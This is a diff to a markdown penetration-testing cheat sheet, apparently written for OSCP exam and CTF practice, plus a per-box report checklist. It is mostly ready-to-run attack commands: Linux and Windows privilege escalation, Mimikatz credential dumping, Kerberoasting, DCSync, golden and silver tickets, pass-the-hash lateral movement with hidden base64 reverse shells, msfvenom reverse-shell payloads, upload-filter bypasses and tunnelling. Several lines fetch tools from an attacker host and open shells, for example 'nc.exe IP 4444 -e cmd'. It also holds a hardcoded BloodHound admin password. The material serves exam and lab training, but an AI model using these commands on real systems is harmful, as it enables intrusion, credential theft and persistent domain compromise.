@@ -23,15 +23,85 @@ xfreerdp3 /u:USER/p:PASS /v:IP /dynamic-resolution
 rdesktop IP -u USER -p PASS
 ```
 
-### Reconnaissance and Enumeration
+### Standard Actions for All Boxes
 
-``` sh
-# Standard actions
-sudo nmap -p- IP
-sudo nmap -p PORTS -A IP
+Baseline commands to run against every box, regardless of findings so far.
+
+#### General
+
+```sh
+# Full port scan (don't rely on top-1000)
+sudo nmap -p- IP -oN full-tcp.txt
+# Service/version detection + default scripts on found ports
+sudo nmap -A -p PORTS IP -oN services.txt
+# Quick UDP top ports (often skipped, often has SNMP/DNS)
+sudo nmap -sU --top-ports 20 IP -oN udp-top.txt
+# Save all loot in a per-box folder
+mkdir -p ~/ctf/IP/{loot,scans,exploits}
+# Check if hostname resolves / add to hosts file
+echo "IP HOSTNAME" | sudo tee -a /etc/hosts
 ```
 
-### Scanning
+#### Linux
+
+```sh
+# Run immediately after getting any shell
+id; whoami; hostname; uname -a
+cat /etc/os-release
+sudo -l
+find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
+getcap -r / 2>/dev/null
+cat /etc/crontab; ls -la /etc/cron*
+netstat -tulnp 2>/dev/null || ss -tulnp
+cat /etc/passwd
+ls -la /home /root 2>/dev/null
+history
+cat /proc/version
+# Always run LinPEAS as a baseline, even if nothing jumps out manually
+./linpeas.sh -a > /dev/shm/linpeas.txt
+```
+
+#### Windows
+
+```ps1
+# Run immediately after getting any shell
+whoami /all
+systeminfo
+hostname
+ipconfig /all
+net user
+net localgroup administrators
+Get-Process
+tasklist /svc
+schtasks /query /fo LIST /v
+# Check AV/EDR presence
+Get-MpComputerStatus
+# Always run WinPEAS as a baseline
+.\winPEAS.exe
+# Check for stored creds / unattended installs
+cmdkey /list
+Get-ChildItem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue
+```
+
+#### Active Directory
+
+```sh
+# Run as soon as any domain credential (even low-priv) is obtained
+nxc smb IP -u 'USER' -p 'PASS' --shares
+nxc smb IP -u 'USER' -p 'PASS' --users
+nxc smb IP -u 'USER' -p 'PASS' --groups
+nxc smb IP -u 'USER' -p 'PASS' --loggedon-users
+nxc ldap IP -u 'USER' -p 'PASS' --password-not-required
+nxc ldap IP -u 'USER' -p 'PASS' --kerberoasting kerberoast.txt
+nxc ldap IP -u 'USER' -p 'PASS' --asreproast asrep.txt
+# Baseline BloodHound collection
+nxc ldap IP -u 'USER' -p 'PASS' --bloodhound -c All
+# Check password policy and RID brute as baseline
+nxc smb IP -u 'USER' -p 'PASS' --pass-pol
+nxc smb IP -u 'USER' -p 'PASS' --rid-brute
+```
+
+### Reconaissance & Scanning
 
 #### Netcat
 
@@ -55,6 +125,8 @@ nikto -h http://target.com
 ```sh
 # Scan all TCP ports, stealth and fast (no ACK)
 sudo nmap -sU -sS -vv IP
+# Scan UDP ports
+sudo nmap -F -sU -vv IP
 # Discovery scan, greppable format
 nmap -v -sn IP -oG ping-sweep.txt
 grep Up ping-sweep.txt | cut -d " " -f 2
@@ -197,6 +269,9 @@ ffuf -w /usr/share/wordlists/rockyou.txt -request flatpress_login -ac -x http://
 john --wordlist=ssh.passwords --rules=sshRules ssh.hash
 # Convert SSH hash
 ssh2john id_rsa > ssh.hash 
+# Convert and crack PDF hash
+pdf2john PDF.pdf > pdf_hash.txt    
+john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
 ```
 
 ##### Cracking
@@ -394,6 +469,64 @@ find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
 find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
 ```
 
+##### Sudo / Kernel Exploits
+
+````sh
+# Check sudo version against known CVEs (e.g. CVE-2021-3156 Baron Samedit)
+sudo -V
+# GTFOBins-style sudo misconfig abuse
+sudo -l
+
+# PwnKit (CVE-2021-4034) check
+pkexec --version
+
+# Kernel exploit suggestion
+searchsploit linux kernel $(uname -r)
+# Or use linux-exploit-suggester
+./linux-exploit-suggester.sh
+````
+
+##### Cron Jobs
+
+````sh
+# Check writable scripts referenced by cron
+cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.daily/
+find / -writable 2>/dev/null | grep -i cron
+
+# PATH hijack if cron script calls binary without full path
+echo $PATH
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/writable/script
+````
+
+##### Docker Group / Capabilities Abuse
+
+````sh
+# Docker group membership = root equivalent
+groups
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# Capabilities abuse (e.g. cap_setuid on python)
+getcap -r / 2>/dev/null
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+````
+
+##### NFS no_root_squash
+
+````sh
+# On attacker, check export
+showmount -e IP
+cat /etc/exports
+
+# Mount and plant SUID binary
+mkdir /tmp/nfs
+mount -o rw,vers=3 IP:/share /tmp/nfs
+cp /bin/bash /tmp/nfs/rootbash
+chmod +s /tmp/nfs/rootbash
+# On target
+/share/rootbash -p
+````
+
 #### Windows
 
 ##### Enumeration
@@ -456,31 +589,6 @@ cp /usr/share/peass/winpeas/winPEASx64.exe .
 python3 -m http.server 80
 iwr -uri http://IP/winPEASx64.exe -Outfile winPEAS.exe
 .\winPEAS.exe
-
-# Bloodhound
-# Install and run
-git clone https://github.com/SpecterOps/BloodHound.git
-# Start docker daemon
-sudo dockerd
-# Start docker
-sudo docker compose up -d
-sudo docker compose ps
-# Get password for 'admin' user
-# Current: 6Br6HLOTlTtbuxfbaw3uASkbM9kd5fWg
-sudo docker compose logs | grep -i -E 'password|username|credential'
-sudo docker compose logs | less
-/password
-# Collect DB
-# Run SharpHound on target
-python3 -m http.server 80 --directory /usr/share/sharphound
-iwr -uri http://192.168.45.229/SharpHound.exe -Outfile sharphound.exe
-./sharphound.exe -c All
-# Setup SMB share on host and copy to it from target
-mkdir -p ~/transfer
-impacket-smbserver transfer ~/transfer -smb2support
-copy ARCHIVE.zip \\IP\transfer\
-# Go to localhost:8080 and upload
-# Check 'shortest path to high value targets
 ```
 
 ##### Execute as other user
@@ -637,21 +745,57 @@ certutil -urlcache -split -f http://192.168.45.235/GodPotato-NET4.exe
 certutil -urlcache -split -f http://192.168.45.235/nc.exe
 .\GodPotato-NET4.exe -cmd "nc.exe 192.168.45.235 4444 -e cmd"
 
-# PrintSpoofer (alternative)
+# PrintSpoofer
 iwr -uri http://IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
+
+# Mimikatz
+# https://adsecurity.org/?page_id=1821
+# Run Mimikatz in elevated PowerShell window
+.\mimikatz.exe
+# Enable SeDebugPrivilege for needed debug privs
+privilege::debug
+# Elevate to SYSTEM privs
+token::elevate
+# Dump passwords
+# Option 1 (local user): extract NThashes from SAM
+lsadump::sam
+# Option 2 (domain user): extract NThashes from LSASS
+sekurlsa::logonpasswords
+# Option 3 (domain user): extract NThashes from service tickets (TGT)
+sekurlsa::tickets
+# Inject malicious SSP (auth provider) into lsass to register to SSPI for authentication to capture plaintext creds
+misc::memssp
+# Check output after auth request happened
+type C:\Windows\System32\mimilsa.log
 ```
 
-##### Kerberoast
+##### AlwaysInstallElevated
 
-https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html
+````ps1
+# Check both registry keys are set to 1
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 
-``` sh
-# Check Kerberoastable users
-Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
-# Crack
-hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt 
-```
+# Generate malicious MSI
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o malicious.msi
+
+# Execute
+msiexec /quiet /qn /i malicious.msi
+````
+
+##### Stored Credentials
+
+````ps1
+# Unattended install files
+Get-ChildItem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue
+
+# Saved RDP / WiFi / registry creds
+cmdkey /list
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+netsh wlan show profile
+netsh wlan show profile name="SSID" key=clear
+````
 
 ##### Code Samples
 
@@ -702,56 +846,227 @@ LPVOID lpReserved ) // Reserved
 }
 ```
 
-##### File Upload Tools
+#### Active Directory
 
-Various ways to upload files to a Windows host.
+##### Enumeration
 
 ``` sh
-# Identify tools available
-where curl
-where wget
-where certutil
-where bitsadmin
-where powershell
-where python
-where ftp
+net user /domain
+net user USER /domain
+net group /domain
+net group "GROUP" /domain
+Get-NetComputer
+Get-NetComputer | select operatingsystem,dnshostname
+Find-DomainShare
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
-# Writable directory candidates
-C:\Temp
-C:\Windows\Temp
-C:\ProgramData
-C:\Users\Public
-%APPDATA%
-# Check write access
-echo test > C:\Temp\test.txt
+# GPP passwords
+gpp-decrypt "ENCRYPTEDPASS"
+```
 
-# HTTP
-# Server
-python3 -m http.server 80
-# Client (PowerShell)
-iwr http://IP/file.exe -OutFile C:\Temp\file.exe
+##### PowerView
 
-# certutil (cmd only, no PS)
-certutil -urlcache -split -f http://IP/file.exe C:\Temp\file.exe
+```ps1
+# Load PowerView (living off the land / transferred binary)
+IEX (New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1')
 
-# Curl (Win 10 1803+)
-curl http://IP/file.exe -o C:\Temp\file.exe
+# Core enumeration
+Get-NetUser | select cn,pwdlastset,lastlogon
+Get-NetGroup | select cn
+Get-NetGroupMember "Domain Admins"
+Get-DomainTrust
+```
 
-# Bitsadmin
-bitsadmin /transfer job http://IP/file.exe C:\Temp\file.exe
+##### Bloodhound
 
-# FTP
-ftp IP
-put FILE
+``` sh
+# Install and run
+git clone https://github.com/SpecterOps/BloodHound.git
+# Start docker daemon
+sudo dockerd
+# Start docker
+sudo docker compose up -d
+sudo docker compose ps
+# Get password for 'admin' user
+# Current: 6Br6HLOTlTtbuxfbaw3uASkbM9kd5fWg
+sudo docker compose logs | grep -i -E 'password|username|credential'
+sudo docker compose logs | less
+/password
+# Collect DB
+# Run SharpHound on target
+python3 -m http.server 80 --directory /usr/share/sharphound
+iwr -uri http://192.168.45.229/SharpHound.exe -Outfile sharphound.exe
+./sharphound.exe -c All
+# Setup SMB share on host and copy to it from target
+mkdir -p ~/transfer
+impacket-smbserver transfer ~/transfer -smb2support
+copy ARCHIVE.zip \\IP\transfer\
+# Go to localhost:8080 and upload
 
-# SMB
-# Server
-impacket-smbserver share $(pwd) -smb2support
-# Client
-copy \\IP\share\file.exe C:\Temp\file.exe
-# or map
-net use Z: \\IP\share
-Z:\file.exe
+# Queries
+# Query all systems: 
+MATCH (m:Computer) RETURN m
+# Query all users
+MATCH (m:User) RETURN m
+# Active user sessions
+MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
+# Check 'shortest path to high value targets' using saved queries
+# Check 'list all kerberoastable accounts' using saved queries
+```
+
+##### Kerberoasting
+
+https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html
+
+``` sh
+# Check Kerberoastable users on Linux/Windows using Impacket/Powersploit/Rubeus
+# Requires GenericWrite/GenericAll on target user
+impacket-addspn -u DOMAIN\\USER -p PASS -s HTTP/fake IP TARGET_USER
+impacket-GetUserSPNs -request -dc-ip IP DOMAIN/USER:PASS -target TARGET_USER
+impacket-GetUserSPNs -request -dc-ip IP DOMAIN/USER
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+# Crack
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt 
+```
+
+##### AS-REP Roasting
+
+``` sh
+# Check users without pre-auth
+Get-DomainUser -PreauthNotRequired
+impacket-GetNPUsers -dc-ip IP  -request -outputfile hashes.asreproast DOMAIN/USER
+
+# From Linux/Windows using Impacket/Rubeus
+# https://github.com/GhostPack/Rubeus
+impacket-GetNPUsers -dc-ip IP  -request -outputfile hashes.asreproast DOMAIN/USER
+.\Rubeus.exe asreproast /nowrap
+# Crack
+hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+##### Silver Ticket
+
+``` sh
+# Requires SPN password hash, domain SID, and target SPN
+# domain SID (omit RID; last 4 digits)
+whoami /user
+# Forge ticket using Mimikatz
+.\mimikatz.exe
+kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /ptt /target:HOST.DOMAIN /service:http /rc4:NTLM_HASH /user:USER_TO_INJECT
+# Verify with klist
+klist
+```
+
+##### DC Sync
+
+``` sh
+# To launch replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
+# With Mimikatz from domain joined system
+.\mimikatz.exe
+lsadump::dcsync /user:DOMAIN\USER
+# With Impacket
+impacket-secretsdump -just-dc-user TARGET_USER DOMAIN/SOURCE_USER:"SOURCE_USER_PASS\!"@DC_IP
+
+# Crack
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+##### Lateral Movement
+
+``` sh
+# WMI
+# Create process on remote host from domain joined system
+# User needs to be part of 'Administrators' local group
+# Via wmic (deprecated)
+wmic /node:IP /user:USER /password:PASS! process call create "powershell -nop -w hidden -e BASE64_REVSHELL"
+# Via PowerShell
+$username = 'USER';
+$password = 'PASS';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName IP -Credential $credential -SessionOption $Options 
+$command = 'powershell -nop -w hidden -e BASE64_REVSHELL';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+# WinRM
+# See protocol section
+
+# PsExec
+# Requires (last two are defaults): 
+# 1. User that authenticates to the target machine needs to be part of the Administrators local group
+# 2. ADMIN$ share must be available
+# 3. File and Printer Sharing has to be turned on
+.\PsExec64.exe -i  \\HOST -u DOMAIN\USER -p PASS cmd
+
+# Pass-the-Hash
+# Only for NTLM auth, not Kerberos
+# Requires (last two are defaults): 
+# 1. User that authenticates to the target machine needs to be part of the Administrators local group
+# 2. ADMIN$ share must be available
+# 3. File and Printer Sharing has to be turned on
+/usr/bin/impacket-wmiexec -hashes :NT_HASH USER@IP
+
+# Overpass-the-Hash
+# Upgrade NTLM hash to Kerberos TGT
+# Get target user credentials cached on system (with NTLM hash), e.g. via RDP session and running notepad.exe as that user using right-click menu
+# Can validate with Mimikatz
+privilege::debug
+sekurlsa::logonpasswords
+# Get PowerShell process in context of target user
+sekurlsa::pth /user:TARGET_USER /domain:DOMAIN /ntlm:NTLM_HASH /run:powershell
+# Get TGT (example)
+net use \\HOST
+# Validate
+klist
+# Can now use any tool that uses Kerberos auth, like PsExec
+.\PsExec.exe \\HOST cmd
+
+# Pass-the-Ticket
+# Export all TGT/TGS from useres from memory using Mimikatz
+privilege::debug
+sekurlsa::tickets /export
+dir *.kirbi
+# Inject ticket
+kerberos::ptt FILENAME.kirbi
+# Validate
+klist
+# Check if impersonation works (example)
+ls \\HOST\SHARE
+
+# DCOM
+# From elevated PowerShell
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","IP"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+```
+
+##### Persistence
+
+``` sh
+# Golden Ticket
+# Leverages krbtgt user password hash
+# Requires:
+# a. Domain Admin's group account 
+# b. Compromised the domain controller itself
+# Get krbtgt using Mimikatz on DC
+privilege::debug
+lsadump::lsa /patch
+# Purge tickets on target host and create golden ticket
+kerberos::purge
+kerberos::golden /user:USER /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
+misc::cmd
+
+# Shadow Copy (also known as Volume Shadow Service)
+# Microsoft backup technology that allows the creation of snapshots of files or entire volumes
+# Can be used to get NTDS.dit for offline cracking
+# Requires domain admin on DC
+# From elevated command prompt
+vshadow.exe -nw -p  C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+reg.exe save hklm\system c:\system.bak
+# Dump passwords
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 
 ### Protocols
@@ -996,6 +1311,18 @@ https://hackviser.com/tactics/tools/enum4linux
 enum4linux -a IP
 ```
 
+##### rpcclient
+
+````sh
+# Null session
+rpcclient -U "" -N IP
+
+# Enumerate users / groups
+rpcclient -U "" -N IP -c "enumdomusers"
+rpcclient -U "" -N IP -c "enumdomgroups"
+rpcclient -U "" -N IP -c "queryuser USERNAME"
+````
+
 ##### smbmap
 
 ```sh
@@ -1040,6 +1367,13 @@ nxc smb IP -u 'USER' -p 'PASS' -M spider_plus -o READ_ONLY=false
 nxc smb IP -u 'USER' -p 'PASS'
 # Against a subnet containing other Windows hosts:
 nxc smb IP/24 -u 'USER' -p 'PASS'
+```
+
+##### CrackMmapExec
+
+``` sh
+# Check list of users against a single password
+crackmapexec smb IP -u users.txt -p 'PASS!' -d DOMAIN.com --continue-on-success
 ```
 
 ##### smbclient
@@ -1288,6 +1622,26 @@ nxc winrm IP -u users.txt -p 'PASS'
 nxc winrm IP -u users.txt -p 'PASS'
 ```
 
+##### winrs
+
+``` sh
+# From domain joined system
+# For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host
+winrs -r:HOST -u:USER -p:PASS  "cmd /c hostname & whoami"
+```
+
+##### PowerShell
+
+``` sh
+# From domain joined system
+$username = 'USER';
+$password = 'PASS';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName IP -Credential $credential
+Enter-PSSession 1
+```
+
 #### Databases
 
 ##### MSSQL (TCP: 1433)
@@ -1378,7 +1732,17 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > reverse.exe
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell
 # PHP
 msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=IP LPORT=PORT > pwn.php
+# JSP/WAR, ASP stageless
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
 
+# File upload extension bypass common attempts
+shell.php.jpg
+shell.pHp
+shell.php%00.jpg
+shell.phtml / shell.phar / shell.php5
+shell.php.....
 ```
 
 #### Listeners
@@ -1395,6 +1759,10 @@ msfconsole -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;s
 # Powercat listener script (Kali) and command to execute
 cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
 IEX (New-Object System.Net.Webclient).DownloadString("http://IP/powercat.ps1");powercat -c IP -p PORT -e powershell 
+
+# Penelope
+# https://github.com/brightio/penelope
+penelope -p 4444
 ```
 
 #### Upgrade shell
@@ -1409,35 +1777,166 @@ stty raw -echo; fg
 Enter
 ```
 
-### Windows Authentication
+### Tunneling
 
-#### Mimikatz
+#### Ligolo-NG
 
-```sh
-# Run Mimikatz in elevated PowerShell window
-.\mimikatz.exe
+https://github.com/nicocha30/ligolo-ng/releases/
+https://www.tejasl.com/blog/2026/03/03/ligolo-ng-cheatsheet/
 
-# Enable SeDebugPrivilege for needed debug privs
-privilege::debug
+``` sh
+# Install
+# Get agent and proxy
+# https://github.com/nicocha30/ligolo-ng/releases/
+tar -xzf *.tar.gz
+chmod +x proxy
+# Create interface 
+interface_create --name "ligolo"
 
-# Elevate to SYSTEM privs
-token::elevate
+# Transfer to target
+python3 -m http.server 80
+iwr -uri http://192.168.45.152/agent.exe -UseBasicParsing -Outfile agent.exe
 
-# Dump passwords
-# Option 1 (local user): extract NThashes from SAM
-lsadump::sam
-# Option 2 (domain user): extract NThashes from LSASS
-sekurlsa::logonpasswords
+# Start interface and proxy
+sudo ip link set ligolo up
+sudo ./proxy -selfcert
+# Start agent
+.\agent.exe --connect IP:11601 -ignore-cert
+# Establish tunnel by adding route
+session
+ifconfig
+interface_add_route --name ligolo --route FROM_IFCONFIG  
+start
 
-# Inject malicious SSP (auth provider) into lsass to register to SSPI for authentication to capture plaintext creds
-misc::memssp
-# Check output after auth request happened
-type C:\Windows\System32\mimilsa.log
+# Get localhost access
+# Make use of special route
+interface_add_route --name ligolo --route 240.0.0.1/32 
+route_list
+curl 240.0.0.1 
+
+# Webui credentials
+ligolo:password:http://127.0.0.1:8080
+```
+
+#### Chisel
+
+``` sh
+# On host
+chmod a+x chisel
+./chisel server -p 8080 --reverse
+# On target
+# Move chisel.exe
+chisel.exe client HOST_IP:8080 R:LOCALPORT:REMOTE_HOST:REMOTEPORT
+```
+
+#### SSH
+
+##### Linux
+
+``` sh
+# Setup an SSH connection from victim1 to victim2, to reach victim3
+# Run on victim1
+# It will listen on port 4455 on all interfaces on victim1 and redirect to victim2
+# On victim2, it will point all network traffic to victim3
+# Flag -L: [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT
+# Flag -N: don't open shell
+# Flag -v: use if getting errors for verbose output
+ssh -N -L 0.0.0.0:4455:victim3_IP:victim3_PORT victim2_USER@victim2_IP
+
+# SSH dynamic port forwarding
+# Use dynamic port forwarding to be able to reach any port on victim3
+# However, since this uses SOCKS protocol, we need to talk in SOCKS traffic
+ssh -N -D 0.0.0.0:9999 victim2_USER@victim2_IP
+# You can use Proxychains to force traffic to SOCKS; alter the config
+nano /etc/proxychains4.conf
+socks5 victim1_IP 9999
+# Run command with Proxychains to hook into it (must be dynamically linked); examples
+proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+sudo proxychains nmap -vvv -sT --top-ports=20 -Pn TARGET_IP
+
+# SSH remote port forwarding
+# Like reverse shell for port forwarding, use outbound connection from victim1
+# Will connect to Kali host from victim1 and build the pipeline via the kali lookback interface
+# May have to allow password-based auth by setting PasswordAuthentication to yes in /etc/ssh/sshd_config
+sudo systemctl start ssh
+ssh -N -R 127.0.0.1:2345:victim2_IP:victim2_PORT kali@LOCAL_IP
+
+# SSH remote dynamic port forwarding
+# SSH client version must be >=7.6
+ssh -N -R 9998 kali@LOCAL_IP
+# You can use Proxychains to force traffic to SOCKS; alter the config
+nano /etc/proxychains4.conf
+socks5 127.0.0.1 9998
+# Examples
+sudo proxychains nmap -vvv -sT --top-ports=20 -Pn TARGET_IP
+
+# Using sshutle
+# Requires root privileges on the SSH client and Python3 on the SSH server
+# Setup Socat port forward on victim1
+socat TCP-LISTEN:2222,fork TCP:TARGET_IP:TARGET_PORT
+# Setup sshuttle to forward any request to SUBNET_X via victim1
+sshuttle -r USER@victim1_IP:2222 SUBNET_1 SUBNET_2 ...
+# Example
+smbclient -L //SUBNET_2_IP/ -U hr_admin --password=Welcome1234
+```
+
+##### Windows
+
+``` sh
+# Works the same as Linux, example: remote dynamic port forward
+# Start SSH server on Kali
+sudo systemctl start ssh
+# Connect to Windows victim1 machine via RDP
+xfreerdp /u:USER /p:PASSWORD /v:victim1_IP
+# Find SSH on Windows host
+where ssh
+# Check if client version is >=7.6
+ssh.exe -V
+# Setup remote SSH tunnel with dynamic port forward
+ssh -N -R 9998 kali@LOCAL_IP
+# Adjust Proxychains config
+nano /etc/proxychains4.conf
+socks5 127.0.0.1 9998
+# Example
+proxychains psql -h victim2_IP -U postgres
+
+# Plink 
+# When SSH client is not available on victim but tools like PuTTy and Plink (cli) are
+# Lacks support for remote dynamic port forwarding and may expose credentials if passwords are passed on cli.
+# Find Plink binary on Kali
+find / -name plink.exe 2>/dev/null
+# Copy for transfer and start webserver
+sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+sudo systemctl start apache2
+# Download binary on Windows victim1
+powershell wget -Uri http://LOCAL_IP/plink.exe -OutFile C:\Windows\Temp\plink.exe
+# Setup remote SSH port forwarding from victim1 that only has port 80 exposed, to get RDP into port 3389 via loopback
+C:\Windows\Temp\plink.exe -ssh -l kali -pw PASSWORD -R 127.0.0.1:9833:127.0.0.1:3389 LOCAL_IP
+# In case of very limited prompt that doesn't accept input
+cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw PASSWORD -R 127.0.0.1:9833:127.0.0.1:victim1_PORT LOCAL_IP
+# Get RDP on victim1 from Kali (Kali ->(loopback) victim1:80 ->(loopback) victim1:3389
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+
+# Netsh
+# Requires admin privs on Windows
+# Run on Windows victim1
+netsh interface portproxy add v4tov4 listenport=victim1_PORT listenaddress=victim1_IP connectport=victim2_PORT connectaddress=victim2_IP
+# Validate
+netsh interface portproxy show all
+# Delete port forward
+netsh interface portproxy del v4tov4 listenport=victim1_PORT listenaddress=victim1_IP
+# When needed, open port victim1_PORT on victim1 with firewall rule
+netsh advfirewall firewall add rule name="NAME" protocol=TCP dir=in localip=victim1_IP localport=victim1_PORT action=allow
+# Delete firewall rule
+netsh advfirewall firewall delete rule name="NAME"
 ```
 
 ### Misc.
 
 ```sh
+# Last minute tips
+# https://hackwithmike.com/oscp/tips
+
 # Folders/files to look in
 /var/www/html/ 
 /etc/passwd
@@ -1521,6 +2020,110 @@ mkdir -p ~/transfer
 impacket-smbserver transfer ~/transfer -smb2support
 copy FILE \\IP\transfer\
 ```
+
+#### Windows File Upload Methods
+
+Various ways to upload files to a Windows host.
+
+``` sh
+# Identify tools available
+where curl
+where wget
+where certutil
+where bitsadmin
+where powershell
+where python
+where ftp
+
+# Writable directory candidates
+C:\Temp
+C:\Windows\Temp
+C:\ProgramData
+C:\Users\Public
+%APPDATA%
+# Check write access
+echo test > C:\Temp\test.txt
+
+# HTTP
+# Server
+python3 -m http.server 80
+# Client (PowerShell)
+iwr http://IP/file.exe -OutFile C:\Temp\file.exe
+
+# certutil (cmd only, no PS)
+certutil -urlcache -split -f http://IP/file.exe C:\Temp\file.exe
+
+# Curl (Win 10 1803+)
+curl http://IP/file.exe -o C:\Temp\file.exe
+
+# Bitsadmin
+bitsadmin /transfer job http://IP/file.exe C:\Temp\file.exe
+
+# FTP
+ftp IP
+put FILE
+
+# SMB
+# Server
+impacket-smbserver share $(pwd) -smb2support
+# Client
+copy \\IP\share\file.exe C:\Temp\file.exe
+# or map
+net use Z: \\IP\share
+Z:\file.exe
+```
+
+#### OSCP Exam Report Checklist (per box)
+
+Required per target machine — missing any of these items risks point deductions.
+
+##### Reconnaissance
+
+- [ ] Full nmap scan command and output (all ports, not just top ports)
+- [ ] Service enumeration output (versions, banners)
+- [ ] Any web directory/subdomain enumeration performed, with tool + wordlist used
+
+##### Initial Access / Foothold
+
+- [ ] Vulnerability identified, with CVE/reference if applicable
+- [ ] Exact exploit command or payload used (full syntax, not paraphrased)
+- [ ] Proof of the exploit working (screenshot or terminal output showing shell/access gained)
+- [ ] Local/proof.txt flag retrieved and its contents shown
+
+##### Privilege Escalation
+
+- [ ] Enumeration steps taken (manual commands and/or LinPEAS/WinPEAS output referenced)
+- [ ] Exact vulnerability/misconfiguration exploited for privesc
+- [ ] Exact command(s) used to escalate privileges
+- [ ] Proof of elevated privileges (id/whoami showing root or SYSTEM)
+- [ ] Proof.txt (root/system flag) retrieved and its contents shown
+
+##### Screenshots (mandatory)
+
+- [ ] Command executed AND its output visible in same screenshot
+- [ ] Shell prompt showing target IP/hostname visible (to prove correct host)
+- [ ] Both local.txt and proof.txt contents shown clearly, uncropped
+- [ ] Full command line visible, not truncated
+
+##### Supporting Documentation
+
+- [ ] All commands listed in chronological, reproducible order
+- [ ] Any custom scripts/exploits used, included as appendix or inline with explanation
+- [ ] Explanation of why each vulnerability exists (root cause, not just "ran exploit")
+- [ ] Any pivoting/tunneling steps fully documented if used to reach the box
+
+##### Active Directory Specific (if applicable)
+
+- [ ] Domain enumeration output (users, groups, computers)
+- [ ] Attack path explained (e.g. Kerberoasting → cracked hash → lateral movement)
+- [ ] Each hop/box in the chain documented with its own proof
+- [ ] Domain Admin or equivalent compromise proof, if achieved
+
+##### Final Check Before Submission
+
+- [ ] Every flag (local.txt + proof.txt) for every box pasted into report, exactly as retrieved
+- [ ] IP addresses consistent and correct throughout
+- [ ] No missing steps between initial scan and final proof (a stranger could reproduce it)
 
 ### Kali Setup
 
